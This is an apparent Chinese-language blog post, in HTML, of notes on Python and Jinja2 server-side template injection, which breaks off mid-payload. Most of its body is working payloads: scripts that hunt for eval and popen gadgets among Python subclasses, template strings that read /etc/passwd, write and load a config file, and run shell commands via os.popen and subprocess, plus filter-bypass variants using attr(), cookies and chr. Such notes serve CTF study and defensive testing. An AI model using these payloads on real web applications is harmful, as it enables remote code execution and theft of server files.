@@ -1,0 +1,691 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TvT">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ssti https:&#x2F;&#x2F;www.cnblogs.com&#x2F;2ha0yuk7on&#x2F;p&#x2F;16648850.html  python常用魔术方法1234567891011121314151617181920212223242526&amp;#x27;&amp;#x27;.__class__             返回对象所属的类。&amp;#x27;&amp;#x27;.__bases__             以元组的形式返回所">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssti">
+<meta property="og:url" content="http://example.com/2023/06/14/ssti/index.html">
+<meta property="og:site_name" content="TvT&#39;Blog">
+<meta property="og:description" content="ssti https:&#x2F;&#x2F;www.cnblogs.com&#x2F;2ha0yuk7on&#x2F;p&#x2F;16648850.html  python常用魔术方法1234567891011121314151617181920212223242526&amp;#x27;&amp;#x27;.__class__             返回对象所属的类。&amp;#x27;&amp;#x27;.__bases__             以元组的形式返回所">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/14.jpg">
+<meta property="article:published_time" content="2023-06-14T14:09:55.049Z">
+<meta property="article:modified_time" content="2023-06-14T14:09:55.049Z">
+<meta property="article:author" content="TvT">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/14.jpg">
+  
+  
+  
+  <title>ssti - TvT&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="TvT'Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>TvT</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/preview.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ssti"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-14 22:09" pubdate>
+          2023年6月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          116 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ssti</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/2ha0yuk7on/p/16648850.html">https://www.cnblogs.com/2ha0yuk7on/p/16648850.html</a></p>
+</blockquote>
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>             返回对象所属的类。<br><br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__bases__</span>             以元组的形式返回所有父类。<br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__base__</span>              以字符串返回直接继承的第一个父类。<br><br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__mro__</span>               返回类继承的所有类，包括自己这是与<span class="hljs-variable">__bases__</span> 的不同。<br><br><span class="hljs-variable">__subclasses__</span> ( )       等同function.<span class="hljs-variable">__globals__</span>，用于获取function所处空间下可使用的module、方法以及所有变量。获取类的所有子类。<br><br><span class="hljs-variable">__builtins__</span>             获取该类的方法<br><br><span class="hljs-variable">__globals__</span>              返回该方法空间下是包方法，和变量<br><br><span class="hljs-variable">__init__</span>                 类的初始化方法<br><br><span class="hljs-variable">__import__</span>            动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="hljs-variable">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()]<br><br>其他魔术方法<br><span class="hljs-variable">__dict__</span>              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="hljs-variable">__dict__</span>里<br><span class="hljs-variable">__getattribute__</span>()    获取到实例、类、函数的属性。<br><span class="hljs-variable">__getitem__</span>()         调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="hljs-string">&#x27;b&#x27;</span>]，就是a.<span class="hljs-variable">__getitem__</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br><span class="hljs-variable">__builtin__</span>           与 <span class="hljs-variable">__builtin</span>区别见https:<span class="hljs-comment">//blog.csdn.net/baidu_38207644/article/details/109378921</span><br><span class="hljs-variable">__import__</span>            动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="hljs-variable">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()]<br><span class="hljs-variable">__str__</span>()             返回描写这个对象的字符串，可以理解成就是打印出来。<br><span class="hljs-variable">__name__</span>              模块被导入到别的文件中，可以调用这些变量和函数。，它可以标识模块的名字<br><span class="hljs-variable">__globals__</span>           函数会以字典类型返回当前位置的全部全局变量 <br></code></pre></td></tr></table></figure>
+
+<h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><h4 id="使用eval"><a href="#使用eval" class="headerlink" title="使用eval"></a>使用eval</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sqf">num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>():<br>    <span class="hljs-keyword">try</span>:<br>     <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-built_in">in</span>  <span class="hljs-built_in">str</span>(i.<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]):<br>         print(f<span class="hljs-string">&#x27;&quot;&quot;.__class__.__mro__[1].__subclasses__()[&#123;num&#125;].__init__.__globals__[\&#x27;</span><span class="hljs-variable">__builtins__</span>\<span class="hljs-string">&#x27;][\&#x27;</span>eval\<span class="hljs-string">&#x27;](\&#x27;</span><span class="hljs-variable">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;whoami&quot;</span>).read()\<span class="hljs-string">&#x27;)&#x27;</span>)<br>         num += <span class="hljs-number">1</span><br>    except:<br>           num+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sqf">num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> ().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>():<br>    <span class="hljs-keyword">try</span>:<br>     <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-built_in">in</span>  <span class="hljs-built_in">str</span>(i.<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]):<br>         print(f<span class="hljs-string">&#x27;().__class__.__bases__[0].__subclasses__()[&#123;num&#125;].__init__.__globals__[\&#x27;</span><span class="hljs-variable">__builtins__</span>\<span class="hljs-string">&#x27;][\&#x27;</span>eval\<span class="hljs-string">&#x27;](\&#x27;</span><span class="hljs-variable">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;whoami&quot;</span>).read()\<span class="hljs-string">&#x27;)&#x27;</span>)<br>         num += <span class="hljs-number">1</span><br>    except:<br>           num+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="使用-wrap-close"><a href="#使用-wrap-close" class="headerlink" title="使用_wrap_close"></a>使用_wrap_close</h4><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">num</span> = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__():<br>    <span class="hljs-keyword">try</span>:<br>     <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;_wrap_close&#x27;</span> <span class="hljs-keyword">in</span>  str(i.__init__):<br>         <span class="hljs-built_in">print</span>(i,<span class="hljs-built_in">num</span>)<br>         <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[&#123;num&#125;].__init__.__globals__[\&#x27;popen\&#x27;](\&#x27;dir\&#x27;).read()&#x27;</span>)<br>         <span class="hljs-built_in">num</span> += <span class="hljs-number">1</span><br>     <span class="hljs-keyword">else</span>:<br>         <span class="hljs-built_in">num</span> += <span class="hljs-number">1</span><br>    except:<br>           <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;-&#x27;</span>)<br>           <span class="hljs-built_in">num</span>+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="其他一些常见playload"><a href="#其他一些常见playload" class="headerlink" title="其他一些常见playload"></a>其他一些常见playload</h4><h5 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#文件读取和写入</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml">  </span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[40](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml">  </span><br><span class="language-xml"></span><br><span class="language-xml">#每次执行都要先写然后编译执行</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[40](<span class="hljs-name">&#x27;/tmp/owned.cfg&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-name">&#x27;code&#x27;</span>)&#125;&#125;</span><span class="language-xml">  </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.from_pyfile</span>(<span class="hljs-name">&#x27;/tmp/owned.cfg&#x27;</span>) &#125;&#125;</span><span class="language-xml">  </span><br><span class="language-xml"></span><br><span class="language-xml">#命令执行</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](<span class="hljs-name">&#x27;1+1&#x27;</span>)&#125;&#125;</span><span class="language-xml">  </span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#system函数换为popen(&#x27;&#x27;).read()，需要导入os模块</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#不需要导入os模块，直接从别的模块调用</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#读文件</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[177].__init__.__globals__.__builtins__[&#x27;open&#x27;](<span class="hljs-name">&#x27;d://whale.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#命令执行</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#命令执行（变种）</span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="language-xml">	&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;	</span><br><span class="language-xml">    </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].eval(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&#123;% endif %&#125;</span><br><span class="language-xml">&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">#读文件（变种）</span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="language-xml">&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&#123;% endif %&#125;</span><br><span class="language-xml">&#123;% endfor %&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">subprocess.Popen类</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[258](<span class="hljs-name">&#x27;cat flag&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">__builtins__类</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[196].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">os函数</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[258].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="jinjia"><a href="#jinjia" class="headerlink" title="jinjia"></a>jinjia</h3><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id=""><a href="#" class="headerlink" title="."></a>.</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">使用[]</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;</span>[&quot;__class__&quot;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">使用|attr()</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;</span>|attr(<span class="hljs-name">&quot;__class__&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&quot;__class__&quot;</span>)|attr(<span class="hljs-name">&quot;__base__&quot;</span>)|attr(<span class="hljs-name">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-name">&quot;__getitem__&quot;</span>)(<span class="hljs-name">80</span>)|attr(<span class="hljs-name">&quot;__init__&quot;</span>)|attr(<span class="hljs-name">&quot;__globals__&quot;</span>)|attr(<span class="hljs-name">&quot;__getitem__&quot;</span>)(<span class="hljs-name">&quot;__builtins__&quot;</span>)|attr(<span class="hljs-name">&quot;__getitem__&quot;</span>)(<span class="hljs-name">&quot;eval&quot;</span>)(<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">使用构造器</span><br><span class="language-xml">&#123;% set point = self|float|string|min %&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="-1"><a href="#-1" class="headerlink" title="{}"></a>{}</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123;&#125;&#125;<br>&#123;%%&#125;来进行绕过<br><br>或者使用&#123;%<span class="hljs-built_in">print</span>()%&#125;<br>&#123;%<span class="hljs-built_in">print</span>(&#x27;&#x27;.__class__.__base__.__subclasses__()<span class="hljs-selector-attr">[80]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(&quot;__import__(&#x27;os&#x27;)<span class="hljs-selector-class">.popen</span>(&#x27;whoami&#x27;)<span class="hljs-selector-class">.read</span>()&quot;))%&#125;<br></code></pre></td></tr></table></figure>
+
+<h5 id="-2"><a href="#-2" class="headerlink" title="[]"></a>[]</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">__getitem__绕过</span><br><span class="language-xml">&#123;&#125;.__class__.__bases__[0] 就相当于</span><br><span class="language-xml">&#123;&#125;.__class__.__bases__.__getitem__(0)</span><br><span class="language-xml"></span><br><span class="language-xml">使用pop函数绕过</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__.__getitem__</span>(<span class="hljs-name">1</span>).__subclasses__().pop(<span class="hljs-name">80</span>)&#125;&#125;</span><span class="language-xml">//但不是任何环境都可以使用这个函数</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+<h5 id="“”"><a href="#“”" class="headerlink" title="“”"></a>“”</h5><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">使用request来绕过，这边使用了cookie进行传参</span><br><span class="language-xml">code=</span><span class="hljs-template-variable">&#123;&#123;x.__init__.__globals__.__getitem__(request.cookies.x<span class="hljs-number">1</span>).eval(request.cookies.x<span class="hljs-number">2</span>)&#125;&#125;</span><span class="language-xml">  </span><br><span class="language-xml">Cookie:x1=__builtins__;x2=__import__(&#x27;os&#x27;).popen(&#x27;cat f*&#x27;).read()</span><br><span class="language-xml">|在python的flask中的框架，可以通过request.args.get[&#x27;key&#x27;]来获取url中的get参数，类似于php中$_GET[&#x27;key&#x27;] ，在进行python模板注入时，我们可以利用这个性质来绕过关键字的书写</span><br><span class="language-xml"></span><br><span class="language-xml">使用chr绕过</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(().__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">258</span>].__init__.__globals__[chr(<span 